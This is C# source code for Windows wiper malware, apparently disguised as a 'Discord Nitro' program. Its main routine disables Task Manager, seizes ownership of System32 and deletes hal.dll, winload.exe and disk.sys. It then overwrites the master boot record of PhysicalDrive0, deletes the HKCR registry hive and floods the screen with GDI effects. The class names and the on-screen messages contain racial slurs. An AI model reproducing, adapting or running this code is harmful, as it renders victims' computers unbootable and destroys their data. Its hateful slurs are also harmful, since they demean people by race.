using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32;
using System.Diagnostics.Eventing.Reader;

namespace Discord_Nitro
{
    public class NiggerDieDie666
    {
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        //for BlockMouse
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int crColor);
        [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        BLENDFUNCTION blendFunction);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);
        [DllImport("kernel32")]

        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);
        enum TernaryRasterOperations : uint
        {
            /// <summary>dest = source</summary>
            SRCCOPY = 0x00CC0020,
            /// <summary>dest = source OR dest</summary>
            SRCPAINT = 0x00EE0086,
            /// <summary>dest = source AND dest</summary>
            SRCAND = 0x008800C6,
            /// <summary>dest = source XOR dest</summary>
            SRCINVERT = 0x00660046,
            /// <summary>dest = source AND (NOT dest)</summary>
            SRCERASE = 0x00440328,
            /// <summary>dest = (NOT source)</summary>
            NOTSRCCOPY = 0x00330008,
            /// <summary>dest = (NOT src) AND (NOT dest)</summary>
            NOTSRCERASE = 0x001100A6,
            /// <summary>dest = (source AND pattern)</summary>
            MERGECOPY = 0x00C000CA,
            /// <summary>dest = (NOT source) OR dest</summary>
            MERGEPAINT = 0x00BB0226,
            /// <summary>dest = pattern</summary>
            PATCOPY = 0x00F00021,
            /// <summary>dest = DPSnoo</summary>
            PATPAINT = 0x00FB0A09,
            /// <summary>dest = pattern XOR dest</summary>
            PATINVERT = 0x005A0049,
            /// <summary>dest = (NOT dest)</summary>
            DSTINVERT = 0x00550009,
            /// <summary>dest = BLACK</summary>
            BLACKNESS = 0x00000042,
            /// <summary>dest = WHITE</summary>
            WHITENESS = 0x00FF0062,
            /// <summary>
            /// Capture window as seen on screen.  This includes layered windows
            /// such as WPF windows with AllowsTransparency="true"
            /// </summary>
            CAPTUREBLT = 0x40000000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        //
        // currently defined blend operation
        //
        const int AC_SRC_OVER = 0x00;

        //
        // currently defined alpha format
        //
        const int AC_SRC_ALPHA = 0x01;

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            // IntPtr típusú változók deklarálása
            IntPtr large;
            IntPtr small;

            // ExtractIconEx függvény meghívása a megadott fájlban található ikonok kinyerésére
            // A kinyert ikonokat large és small változókba menti
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                // Ha a largeIcon értéke true, akkor visszatér egy nagy ikonnal, egyébként egy kicsivel
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                // Hiba esetén null értékkel tér vissza
                return null;
            }
        }
        public static void Main()
        {
            // Bizonyos változók inicializálása
            int isCritical = 1; // we want this to be a Critical Process
            int BreakOnTermination = 0x1D; // value for BreakOnTermination (flag)
            // Process belép a hibakeresési módba
            Process.EnterDebugMode();
            // Az NtSetInformationProcess egy olyan függvényhívás, amely egy adott folyamat (process) futását befolyásolja a Windows operációs rendszeren. A BreakOnTermination konkrétan egy olyan paraméter, amely megmondja a rendszernek, hogy a folyamat terminálásakor meg kell-e törnie a futást.
            // Process Handle (Process.GetCurrentProcess().Handle): Ez egy folyamatot azonosító "handle", ami egy egyedi azonosítót jelöl az adott futó programhoz a Windows operációs rendszerben.
            // Process a BreakOnTermination(Meghatározza az infót és a lekérdezési folyamatot / rendszer folyamat szüneteltetése) értéket kapja, a ref isCritical tartalmazza az infó értékét amit be akarunk állítani vagy lekérdezni.
            // Information Buffer Length (sizeof(int)): Ez a buffer hosszát határozza meg, vagyis hogy mennyi memóriát foglaljon le az információ számára. Mivel az isCritical egy egész szám, ezért annak a mérete lesz itt a buffer mérete.
            // Windows Defender Off
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey nigga = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            nigga.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // Task Manager offos
            // Háttérkép eltávolítása
            RegistryKey nigga2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            nigga2.SetValue("Wallpaper", "", RegistryValueKind.String);

            //system32 mappa és driverek 
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();

            //Path sys files and folders
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            //Delete system files
            if (File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }

            // Új szálon futtatja a különbözõ mûveleteket
            // Ez a Main függvény egy kezdeti inicializációt és konfigurációt hajt végre, majd új szálakat indít el az mbr_destroy, GDI_payloads és reg_destroy metódusokkal.
            NiggerDieDie666 mbr_nonstatic = new NiggerDieDie666();
            Thread mbr = new Thread(mbr_nonstatic.mbr_destroy);
            NiggerDieDie666 gdi_nonstatic = new NiggerDieDie666();
            Thread gdi2 = new Thread(gdi_nonstatic.GDI_payloads2);
            NiggerDieDie666 reg_fuk = new NiggerDieDie666();
            mbr.Start();
            gdi2.Start();
            reg_fuk.reg_destroy();
        }
        Random r;
        int count = 1000;
        int x = Screen.PrimaryScreen.Bounds.Width;
        int y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left;
        int top = Screen.PrimaryScreen.Bounds.Top;
        int right = Screen.PrimaryScreen.Bounds.Right;
        int bottom = Screen.PrimaryScreen.Bounds.Bottom;
        bool gdi_text = false;
        Icon some_ico = Extract("shell32.dll", 232, true);

        public void mbr_destroy()
        {
            var mbrData = new byte[MbrSize];
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            try
            {
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                CloseHandle(mbr);
            }
            catch { }
        }
        public void GDI_payloads2()
        {
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            IntPtr desktop = GetDC(IntPtr.Zero);
            int numLines_count = 1000;
            r = new Random();
            for (; ; )
            {
                if (!gdi_text)
                {
                    hwnd = GetDesktopWindow();
                    hdc = GetWindowDC(hwnd);
                    BitBlt(hdc, r.Next(20), r.Next(20), x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                    DeleteDC(hdc);
                    if (numLines_count > 51)
                        Thread.Sleep(numLines_count -= 50);
                    else
                        Thread.Sleep(5);
                }
                else
                {
                    desktop = GetDC(IntPtr.Zero);
                    using (Graphics g = Graphics.FromHdc(desktop))
                    {
                        String[] rndtext = { "?NIGGER", "NIGGER666", "YOU THINK IT WAS AN ANTI-VIRUS HUH?", "OMG", "mbr destroyed" };
                        Font drawFont = new Font("Arial", r.Next(10, 70));
                        SolidBrush brush = new SolidBrush(Color.DarkGreen);
                        int xp = r.Next(x);
                        int yp = r.Next(y);
                        StringFormat stringFormat = new StringFormat();
                        stringFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft;
                        if (r.Next(5) == 0)
                        {
                            g.DrawString(rndtext[r.Next(4)], drawFont, brush, xp, yp, stringFormat);
                        }
                        ReleaseDC(IntPtr.Zero, desktop);
                        Thread.Sleep(50);

                        int count1 = 1000;
                        int x1 = Screen.PrimaryScreen.Bounds.Width, y1 = Screen.PrimaryScreen.Bounds.Height;
                        int left1 = Screen.PrimaryScreen.Bounds.Left, right1 = Screen.PrimaryScreen.Bounds.Right, top1 = Screen.PrimaryScreen.Bounds.Top, bottom1 = Screen.PrimaryScreen.Bounds.Bottom;
                        uint[] rndclr = { 0xFFE000, 0xFF0EBC, 0x0AFF33, 0xFFF700, 0x0DFFEF };
                        uint[] rndclr1 = { 0xFF0023, 0xFF0ABC, 0x0FFF33, 0xFFF770, 0x07FFEF };
                        POINT[] lppoint = new POINT[3];

                        Random R = new Random();
                        IntPtr hwnd1 = GetDesktopWindow();
                        IntPtr hdc111 = GetWindowDC(hwnd);
                        IntPtr desktop1 = GetDC(IntPtr.Zero);
                        IntPtr rndcolor = CreateSolidBrush(0);
                        IntPtr mhdc1 = CreateCompatibleDC(hdc);
                        IntPtr hbit1 = CreateCompatibleBitmap(hdc, x1, y1);
                        IntPtr holdbit1 = SelectObject(mhdc1, hbit1);
                        POINT[] lppoint1 = new POINT[3];
                        for (int num = 0; num < 1000; num++)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            BitBlt(hdc, 0, 0, x1, y1, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                            DeleteDC(hdc);
                            if (count1 > 51)
                                Thread.Sleep(count1 -= 500);
                            else
                                Thread.Sleep(5);
                        }
                        for (int num = 0; num < 300; num++)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            BitBlt(hdc, 0, 0, x1, y1, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                            DeleteDC(hdc);
                            int posX = Cursor.Position.X;
                            int posY = Cursor.Position.Y;
                            desktop = GetDC(IntPtr.Zero);
                            ReleaseDC(IntPtr.Zero, desktop);
                            Thread.Sleep(50);
                        }
                        for (int num = 0; num < 500; num++)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            BitBlt(hdc, 0, R.Next(10), R.Next(x1), y1, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                            DeleteDC(hdc);
                            if (R.Next(300) == 1)
                                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                            Thread.Sleep(R.Next(25));
                        }

                        for (int num = 0; num < 500; num++)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            BitBlt(hdc, R.Next(-3000, x1), R.Next(-30110, y1), R.Next(x1 / 21), R.Next(y1 / 21), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                            DeleteDC(hdc);
                            Thread.Sleep(5);
                        }

                        for (int num = 0; num < 700; num++)
                        {
                            if (num < 300)
                            {
                                hwnd = GetDesktopWindow();
                                hdc = GetWindowDC(hwnd);
                                SelectObject(hdc, rndcolor);
                                BitBlt(hdc, 0, 0, x1, y1, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                                DeleteObject(rndcolor);
                                DeleteDC(hdc);
                                Thread.Sleep(5);
                            }
                            else if (num < 500)
                            {
                                hwnd = GetDesktopWindow();
                                hdc = GetWindowDC(hwnd);
                                SelectObject(hdc, rndcolor);
                                BitBlt(hdc, 0, 0, x1, y1, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                                BitBlt(hdc, 1, 1, x1, y1, hdc, 0, 0, TernaryRasterOperations.SRCERASE);
                                BitBlt(hdc, R.Next(-453, x1), R.Next(-364, y1), R.Next(x1 / 20), R.Next(y1 / 20), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                                DeleteObject(rndcolor);
                                DeleteDC(hdc);
                                Thread.Sleep(5);
                            }
                            else
                            {
                                hwnd = GetDesktopWindow();
                                hdc = GetWindowDC(hwnd);
                                SelectObject(hdc, rndcolor);
                                BitBlt(hdc, 0, 0, x1, y1, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                                BitBlt(hdc, 1, 1, x1, y1, hdc, 0, 0, TernaryRasterOperations.SRCINVERT);
                                DeleteObject(rndcolor);
                                DeleteDC(hdc);
                                Thread.Sleep(5);
                            }
                        }

                        gdi_text = true;
                        for (int num = 0; num < 500; num++)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            lppoint[0].X = left1 + R.Next(255);
                            lppoint[0].Y = top1 + R.Next(255);
                            lppoint[1].X = right1 - R.Next(255);
                            lppoint[1].Y = top1;
                            lppoint[2].X = left1 + R.Next(255);
                            lppoint[2].Y = bottom1 - R.Next(255);
                            PlgBlt(hdc, lppoint, hdc, left1, top1, right1 - left1, bottom1 - top1, IntPtr.Zero, 0, 0);
                            mhdc1 = CreateCompatibleDC(hdc);
                            hbit1 = CreateCompatibleBitmap(hdc, x1, y1);
                            holdbit1 = SelectObject(mhdc1, hbit1);
                            if (R.Next(3) == 1)
                                rndcolor = CreateSolidBrush(100);
                            else if (R.Next(3) == 2)
                                rndcolor = CreateSolidBrush(100000);
                            else if (R.Next(3) == 0)
                                rndcolor = CreateSolidBrush(100000000);
                            SelectObject(mhdc1, rndcolor);
                            Rectangle(mhdc1, left1, top1, right1, bottom1);
                            AlphaBlend(hdc, 0, 0, x1, y1, mhdc1, 0, 0, x1, y1, new BLENDFUNCTION(0, 0, 100, 0));
                            SelectObject(mhdc1, holdbit1);
                            DeleteObject(hbit1);
                            DeleteDC(hdc);
                            Thread.Sleep(1);
                        }
                        Environment.Exit(-1);

                    }

                }
                
            }
        }
        public static void FreezeMouse()
        {
            BlockInput(true);
        }
        public void reg_destroy()
        {
            ProcessStartInfo reg_pusztulás = new ProcessStartInfo();
            reg_pusztulás.FileName = "cmd.exe";
            reg_pusztulás.WindowStyle = ProcessWindowStyle.Hidden;
            reg_pusztulás.Arguments = @"/k reg delete HKCR /f";
            Process.Start(reg_pusztulás);
        }

        public void clear_screen()
        {
            for (int nigger = 0; nigger > 100; nigger++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }
        public void tmr1_add_Tick(object sender, EventArgs e)
        {

            int true_num = r.Next(5); //make random num 1-5

            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://youtu.be/b2JPmyuZft4?si=1lbPYSOdRcAk_R0B");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://youtu.be/b2JPmyuZft4?si=1lbPYSOdRcAk_R0Bg");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://youtu.be/b2JPmyuZft4?si=1lbPYSOdRcAk_R0B");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://youtu.be/b2JPmyuZft4?si=1lbPYSOdRcAk_R0B");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://youtu.be/b2JPmyuZft4?si=1lbPYSOdRcAk_R0B");
            }
           
        }
    }
}